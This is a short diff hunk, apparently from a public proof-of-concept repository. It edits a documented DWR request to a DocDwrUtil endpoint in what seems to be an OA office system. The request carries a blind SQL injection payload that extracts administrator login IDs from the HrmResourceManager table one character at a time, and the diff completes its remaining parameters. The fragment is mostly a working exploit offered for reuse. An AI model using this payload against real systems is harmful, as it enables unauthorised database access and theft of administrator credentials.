@@ -16,8 +16,8 @@ c0-scriptName=DocDwrUtil
 c0-methodName=ifNewsCheckOutByCurrentUser
 c0-id=0
 c0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115
-c0-param1=strin
-
+c0-param1=string:1
+batchId=0
 ```
 ![3a380d7bbc888fb3314bb6b512b4e7db](https://github.com/wy876/POC/assets/139549762/6d40d284-0894-4c18-89dc-5a978d4f5c79)
 
